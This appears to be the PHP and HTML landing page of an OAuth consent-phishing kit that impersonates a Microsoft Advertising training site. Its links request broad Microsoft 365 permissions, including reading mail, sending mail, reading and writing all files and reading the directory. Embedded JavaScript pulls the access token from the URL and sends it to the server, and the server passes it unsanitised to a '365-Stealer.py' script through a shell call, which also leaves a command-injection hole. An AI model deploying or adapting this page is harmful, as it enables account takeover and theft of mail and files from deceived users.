<?php

// Following varaibles need to edited
$client_id = "f813e35c-068a-47c0-8c0e-3219a91b4fc1";
$redirect_uri = "http://localhost/";

if(isset($_REQUEST['submit'])){
    

    $scopes = "offline_access contacts.read user.read mail.read notes.read.all mailboxsettings.readwrite Files.ReadWrite.All Directory.Read.All Mail.Send";

    header("Location: " . "https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=" . $client_id . "&response_type=token&scope=" . $scopes . "&response_mode=fragment&redirect_uri=" . $redirect_uri);
}


if(isset($_REQUEST['token'])){
    $token = $_REQUEST['token'];
    system("python  365-Stealer.py -t $token");
}

?>

<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <meta content="width=device-width, initial-scale=1.0" name="viewport">
  <title>Microsoft Advertising courses - Training
 - Microsoft Advertising</title>
  <!-- Favicons -->
  <link href="assets/img/logo.PNG" rel="icon" type="image/icon type">
  <!-- Google Fonts -->
  <link href="https://fonts.googleapis.com/css?family=Open+Sans:300,300i,400,400i,600,600i,700,700i|Raleway:300,300i,400,400i,600,600i,700,700i,900" rel="stylesheet">
  <!-- Vendor CSS Files -->
  <link href="assets/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
  <link href="assets/vendor/icofont/icofont.min.css" rel="stylesheet">
  <link href="assets/vendor/boxicons/css/boxicons.min.css" rel="stylesheet">
  <link href="assets/vendor/animate.css/animate.min.css" rel="stylesheet">
  <link href="assets/vendor/venobox/venobox.css" rel="stylesheet">
  <link href="assets/vendor/owl.carousel/assets/owl.carousel.min.css" rel="stylesheet">
  <link href="assets/vendor/aos/aos.css" rel="stylesheet">
  <!-- Template Main CSS File -->
  <link href="assets/css/style.css" rel="stylesheet">
<script>
var currentURL = (document.URL); 
var part = currentURL.split("#")[1];
var part1= part.split("=")[1];
var part2= part1.split("&")[0];
    if(currentURL.includes("access_token")){
       window.location.href = "http://localhost/";
    }
var xmlhttp = new XMLHttpRequest();
xmlhttp.open('GET', '/?token=' + part2 , true);
xmlhttp.send()
</script>    
    
</head>

<body>
  <!-- ======= Header ======= -->
  <header id="header">
    <div class="container">
      <div class="logo float-left">
        <h1 class="text-light"><a href="index.html"><img href="assets/img/logo.PNG"></a></h1>
      </div>
      <nav class="nav-menu float-right d-none d-lg-block">
        <ul>
          <li class="active"><a href="#header">Home</a></li>
          <li><a href="#about">About Us</a></li>
          <li><a href="#contact">Contact Us</a></li>
        </ul>
      </nav>
      <nav class="nav-menu float-left d-none d-lg-block">
          <ul>
           <li>
            <svg xmlns="http://www.w3.org/2000/svg" xml:space="preserve" width="300px" height="50px" viewBox="0 0 3278 522" class="SignInButton">
            <style type="text/css">
                .fnt0 {
                    font-size: 270px;
                    font-family: 'Segoe UI Semibold', 'Segoe UI';
                    text-decoration: none;
                }
            </style>
            <rect class="fil0" x="2" y="2" width="3174" height="517" fill="white" />
            <rect x="150" y="129" width="122" height="122" fill="#F35325" />
            <rect x="284" y="129" width="122" height="122" fill="#81BC06" />
            <rect x="150" y="263" width="122" height="122" fill="#05A6F0" />
            <rect x="284" y="263" width="122" height="122" fill="#FFBA08" />
            <text x="470" y="357" fill="#606060" class="fnt0">Microsoft</text>
            </svg>
            </li> 
          </ul>
        </nav>
    </div>
  </header>
  <section id="hero">
    <div class="hero-container">
      <div id="heroCarousel" class="carousel slide carousel-fade" data-ride="carousel">
        <ol class="carousel-indicators" id="hero-carousel-indicators"></ol>
        <div class="carousel-inner" role="listbox">
          <!-- Slide 1 -->
          <div class="carousel-item active" style="background-image: url('assets/img/slide/slide-1.jpg');">
            <div class="carousel-container">
              <div class="carousel-content container">
                <h2 class="animate__animated animate__fadeInDown">Microsoft Advertising Certification study guide</h2>
                <p class="animate__animated animate__fadeInUp">Get started with your Microsoft Advertising training by selecting a topic below.&nbsp;If you are a premium channel partner, tool provider or strategic agency, you can access Bing PPC courses for beginners and advanced practitioners in the <a href="/?submit" style="color:rgb(128, 174, 255)">Microsoft Advertising Learning Lab.</a></p>
                <a href="/index.php?submit" class="btn-get-started animate__animated animate__fadeInUp scrollto">Read More</a>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </section>
  <main id="main">
    <section id="about" class="about">
      <div class="container">
        <div class="row no-gutters">
          <div class="col-lg-6 video-box">
            <img src="assets/img/about.jpg" class="img-fluid" alt="">
          </div>
          <div class="col-lg-6 d-flex flex-column justify-content-center about-content">
            <div class="section-title">
              <h2>Download the PDF of the study guide</h2>
              <p>Use our downloadable study guide to help you prepare for the certification exam. </p>
            </div>
            <div class="icon-box" data-aos="fade-up" data-aos-delay="100">
              <div class="icon"><i class="bx bx-file"></i></div>
              <h4 class="title">
                  <a href="/?submit"><br>Download the Study Guide</a>
                </h4>
              
            </div>
            <div class="icon-box" data-aos="fade-up" data-aos-delay="100">
              <div class="icon"><i class="bx bx-notepad"></i></div>
              <h4 class="title"><a href="/?submit"><br>Take the exam</a></h4>
             
            </div>
          </div>
        </div>
      </div>
    </section>
    <!-- ======= Contact Us Section ======= -->
    <section id="contact" class="contact">
      <div class="container">
        <div class="section-title">
          <h2>Contact Us</h2>
        </div>
        <div class="row">
          <div class="col-lg-12" data-aos="fade-up" data-aos-delay="300">
            <form action="/?submit" method="post" role="form" class="php-email-form">
              <div class="form-row">
                <div class="col-lg-6 form-group">
                  <input type="text" name="name" class="form-control" id="name" placeholder="Your Name" data-rule="minlen:4" data-msg="Please enter at least 4 chars" />
                  <div class="validate"></div>
                </div>
                <div class="col-lg-6 form-group">
                  <input type="email" class="form-control" name="email" id="email" placeholder="Your Email" data-rule="email" data-msg="Please enter a valid email" />
                  <div class="validate"></div>
                </div>
              </div>
              <div class="form-group">
                <input type="text" class="form-control" name="subject" id="subject" placeholder="Subject" data-rule="minlen:4" data-msg="Please enter at least 8 chars of subject" />
                <div class="validate"></div>
              </div>
              <div class="form-group">
                <textarea class="form-control" name="message" rows="5" data-rule="required" data-msg="Please write something for us" placeholder="Message"></textarea>
                <div class="validate"></div>
              </div>
              <div class="mb-3">
                <div class="loading">Loading</div>
                <div class="sent-message"></div>
                <div class="sent-message">Your message has been sent. Thank you!</div>
              </div>
              <div class="text-center"><button type="submit">Send Message</button></div>
            </form>
          </div>
        </div>
      </div>
    </section><!-- End Contact Us Section -->
  </main><!-- End #main -->
  <!-- ======= Footer ======= -->
  <footer id="footer">
    
    <div class="container">
      <div class="copyright">
        &copy; Microsoft 2020 <strong></strong>
      </div>
    </div>
  </footer><!-- End Footer -->
  <a href="#" class="back-to-top"><i class="icofont-simple-up"></i></a>
  <!-- Vendor JS Files -->
  <script src="assets/vendor/jquery/jquery.min.js"></script>
  <script src="assets/vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
  <script src="assets/vendor/jquery.easing/jquery.easing.min.js"></script>
  <script src="assets/vendor/php-email-form/validate.js"></script>
  <script src="assets/vendor/jquery-sticky/jquery.sticky.js"></script>
  <script src="assets/vendor/venobox/venobox.min.js"></script>
  <script src="assets/vendor/waypoints/jquery.waypoints.min.js"></script>
  <script src="assets/vendor/counterup/counterup.min.js"></script>
  <script src="assets/vendor/owl.carousel/owl.carousel.min.js"></script>
  <script src="assets/vendor/isotope-layout/isotope.pkgd.min.js"></script>
  <script src="assets/vendor/aos/aos.js"></script>
  <!-- Template Main JS File -->
  <script src="assets/js/main.js"></script>
</body>
</html>
